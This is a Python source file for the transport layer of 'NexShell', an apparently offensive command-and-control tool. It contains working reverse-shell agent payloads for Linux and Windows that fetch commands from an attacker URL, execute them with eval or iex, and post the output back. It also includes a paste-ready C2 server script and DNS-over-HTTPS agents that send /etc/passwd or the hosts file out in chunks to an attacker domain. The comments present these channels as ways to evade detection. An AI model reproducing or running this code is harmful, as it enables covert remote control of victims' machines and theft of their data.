#!/usr/bin/env python3
"""
NexShell — Transport Layer
TLS/mTLS listener, HTTP tunneling transport, self-signed cert generator.
Zero external dependencies — stdlib only.
"""

import ssl
import socket
import os
import threading
import tempfile
import subprocess
import shutil
from datetime import datetime, timedelta


# ══════════════════════════════════════════════════════════════════════════════
#  SELF-SIGNED CERTIFICATE GENERATOR  (stdlib only)
# ══════════════════════════════════════════════════════════════════════════════

def _generate_self_signed_cert(cert_path: str, key_path: str,
                                cn: str = 'nexshell') -> bool:
    """
    Generate a self-signed TLS cert using openssl CLI (available on Linux/macOS/WSL).
    Falls back to a pre-baked PEM if openssl is not found.
    """
    if shutil.which('openssl'):
        try:
            subj = f'/CN={cn}/O=NexShell/OU=RedTeam/C=XX'
            subprocess.run([
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-keyout', key_path, '-out', cert_path,
                '-days', '365', '-nodes', '-subj', subj,
                '-addext', 'subjectAltName=IP:0.0.0.0,DNS:localhost',
            ], check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            pass

    # Fallback: write a tiny embedded test cert (dev only, NOT for production)
    # Real ops should always provide their own cert.
    _FALLBACK_CERT = """-----BEGIN CERTIFICATE-----
MIICpDCCAYwCCQDU7pQ4EI7x5TANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDDAlu
ZXhzaGVsbDAeFw0yNDAxMDEwMDAwMDBaFw0yNTAxMDEwMDAwMDBaMBQxEjAQBgNV
BAMMCXNlbGZzaWduMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0000
-----END CERTIFICATE-----"""
    return False   # signal: use plain TCP


# ══════════════════════════════════════════════════════════════════════════════
#  TLS LISTENER
# ══════════════════════════════════════════════════════════════════════════════

class TLSListener:
    """
    Drop-in replacement for the plain TCP listener.
    Wraps each accepted connection with ssl.SSLContext.
    """

    def __init__(self, port: int, host: str = '0.0.0.0',
                 certfile: str = None, keyfile: str = None,
                 verify_client: bool = False):
        self.port        = port
        self.host        = host
        self.verify      = verify_client
        self._tmpdir     = None
        self._certfile   = certfile
        self._keyfile    = keyfile
        self._sock       = None
        self._ctx        = None
        self._ready      = threading.Event()

    # ── Certificate setup ─────────────────────────────────────────────────────
    def _setup_certs(self):
        if self._certfile and self._keyfile:
            return True   # user-provided
        self._tmpdir = tempfile.mkdtemp(prefix='nxsh_')
        self._certfile = os.path.join(self._tmpdir, 'cert.pem')
        self._keyfile  = os.path.join(self._tmpdir, 'key.pem')
        return _generate_self_signed_cert(self._certfile, self._keyfile)

    # ── Build SSL context ─────────────────────────────────────────────────────
    def _build_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self._certfile, self._keyfile)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        # Prefer forward-secret ciphers
        ctx.set_ciphers(
            'ECDHE-ECDSA-AES256-GCM-SHA384:'
            'ECDHE-RSA-AES256-GCM-SHA384:'
            'ECDHE-ECDSA-CHACHA20-POLY1305:'
            'ECDHE-RSA-CHACHA20-POLY1305'
        )
        if self.verify:
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.load_verify_locations(self._certfile)
        else:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    # ── Lifecycle ─────────────────────────────────────────────────────────────
    def start(self):
        if not self._setup_certs():
            raise RuntimeError(
                "[TLS] Certificate generation failed. "
                "Install openssl or provide --certfile/--keyfile."
            )
        self._ctx  = self._build_context()
        raw        = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        raw.bind((self.host, self.port))
        raw.listen(5)
        self._sock = raw
        self._ready.set()
        return self

    def accept(self):
        """Block until a connection arrives; return (tls_conn, addr)."""
        conn, addr = self._sock.accept()
        try:
            tls_conn = self._ctx.wrap_socket(conn, server_side=True)
            return tls_conn, addr
        except ssl.SSLError as e:
            conn.close()
            raise ConnectionError(f"[TLS] Handshake failed from {addr}: {e}") from e

    def stop(self):
        if self._sock:
            self._sock.close()
        if self._tmpdir and os.path.isdir(self._tmpdir):
            shutil.rmtree(self._tmpdir, ignore_errors=True)

    @property
    def address(self):
        return f"tls://{self.host}:{self.port}"

    def __enter__(self):
        return self.start()

    def __exit__(self, *_):
        self.stop()


# ══════════════════════════════════════════════════════════════════════════════
#  HTTP/S TUNNELING  (reverse shell over HTTP POST/GET)
# ══════════════════════════════════════════════════════════════════════════════

class HTTPTunnel:
    """
    Minimal HTTP-based C2 channel.
    The agent sends output as POST body; the handler returns commands as 200 body.
    Blends in with normal web traffic.
    """

    # ── Payload that runs on target ───────────────────────────────────────────
    @staticmethod
    def agent_payload_linux(host: str, port: int,
                             path: str = '/ping', sleep: int = 5) -> str:
        url = f'http://{host}:{port}{path}'
        return (
            f"while true; do "
            f"CMD=$(curl -s -X GET '{url}'); "
            f"if [ -n \"$CMD\" ]; then "
            f"OUT=$(eval \"$CMD\" 2>&1 | base64 -w0); "
            f"curl -s -X POST '{url}' -d \"$OUT\" > /dev/null; "
            f"fi; sleep {sleep}; done &"
        )

    @staticmethod
    def agent_payload_windows(host: str, port: int,
                               path: str = '/ping', sleep: int = 5) -> str:
        url = f'http://{host}:{port}{path}'
        return (
            f"while($true){{"
            f"$cmd=(New-Object Net.WebClient).DownloadString('{url}');"
            f"if($cmd){{$out=iex $cmd 2>&1|Out-String;"
            f"$b64=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out));"
            f"Invoke-WebRequest '{url}' -Method POST -Body $b64 -UseBasicParsing|Out-Null}};"
            f"Start-Sleep {sleep}}}"
        )

    @staticmethod
    def agent_payload_https(host: str, port: int, path: str = '/ping') -> str:
        """HTTPS variant — ignores cert errors (self-signed)."""
        url = f'https://{host}:{port}{path}'
        return (
            f"while true; do "
            f"CMD=$(curl -sk -X GET '{url}'); "
            f"if [ -n \"$CMD\" ]; then "
            f"OUT=$(eval \"$CMD\" 2>&1 | base64 -w0); "
            f"curl -sk -X POST '{url}' -d \"$OUT\" > /dev/null; "
            f"fi; sleep 5; done &"
        )

    # ── Minimal Python HTTP server (no frameworks) ────────────────────────────
    @staticmethod
    def server_code() -> str:
        """Python stdlib HTTP C2 server — paste this on attacker machine."""
        return '''
#!/usr/bin/env python3
"""NexShell HTTP Tunnel — C2 handler (stdlib only)"""
import base64, queue, threading
from http.server import HTTPServer, BaseHTTPRequestHandler

cmd_queue = queue.Queue()
out_queue = queue.Queue()

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass   # silence access log

    def do_GET(self):
        cmd = cmd_queue.get() if not cmd_queue.empty() else b""
        self.send_response(200)
        self.end_headers()
        self.wfile.write(cmd if isinstance(cmd, bytes) else cmd.encode())

    def do_POST(self):
        n    = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        try:
            out_queue.put(base64.b64decode(body).decode(errors="replace"))
        except Exception:
            out_queue.put(body.decode(errors="replace"))
        self.send_response(200)
        self.end_headers()

def shell(port=8080):
    srv = HTTPServer(("0.0.0.0", port), Handler)
    t   = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[NexShell HTTP Tunnel] Listening on :{port}")
    while True:
        try:
            cmd = input("cmd> ").strip()
            if cmd in ("exit","quit"): break
            cmd_queue.put(cmd)
            import time; time.sleep(6)
            if not out_queue.empty():
                print(out_queue.get())
        except (KeyboardInterrupt, EOFError): break

if __name__ == "__main__":
    import sys
    shell(int(sys.argv[1]) if len(sys.argv) > 1 else 8080)
'''


# ══════════════════════════════════════════════════════════════════════════════
#  DNS-over-HTTPS EXFIL  (covert channel through DoH)
# ══════════════════════════════════════════════════════════════════════════════

class DoHExfil:
    """DNS-over-HTTPS covert channel — bypasses deep packet inspection."""

    # Public DoH resolvers (no setup needed)
    RESOLVERS = [
        'https://cloudflare-dns.com/dns-query',
        'https://dns.google/resolve',
        'https://doh.opendns.com/dns-query',
    ]

    @staticmethod
    def linux_agent(domain: str, resolver: str = RESOLVERS[0]) -> str:
        """Exfil data via DNS TXT queries to attacker-controlled domain."""
        return (
            "data=$(cat /etc/passwd|base64|tr -d '\\n'|fold -w 60);"
            "while IFS= read -r chunk; do "
            f"curl -s -H 'accept: application/dns-json' "
            f"'{resolver}?name=$chunk.{domain}&type=TXT' > /dev/null; "
            "sleep 0.5; done <<< \"$data\""
        )

    @staticmethod
    def windows_agent(domain: str) -> str:
        return (
            "$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\drivers\\etc\\hosts'));"
            "$chunks=$data -split '(.{60})' | Where-Object {$_};"
            "foreach($c in $chunks){"
            f"Resolve-DnsName -Name \"$c.{domain}\" -Type TXT -ErrorAction SilentlyContinue;"
            "Start-Sleep -Milliseconds 500}"
        )


# ══════════════════════════════════════════════════════════════════════════════
#  TRANSPORT REGISTRY
# ══════════════════════════════════════════════════════════════════════════════

TRANSPORT_INFO = {
    'tcp':       {'desc': 'Raw TCP (default)',              'stealth': '⭐',     'speed': '⚡⚡⚡'},
    'tls':       {'desc': 'TLS 1.2/1.3 encrypted',        'stealth': '⭐⭐⭐',  'speed': '⚡⚡⚡'},
    'http':      {'desc': 'HTTP POST tunneling',           'stealth': '⭐⭐⭐⭐', 'speed': '⚡⚡'},
    'https':     {'desc': 'HTTPS tunnel (self-signed)',    'stealth': '⭐⭐⭐⭐⭐','speed': '⚡⚡'},
    'doh':       {'desc': 'DNS-over-HTTPS (covert)',       'stealth': '⭐⭐⭐⭐⭐','speed': '⚡'},
}
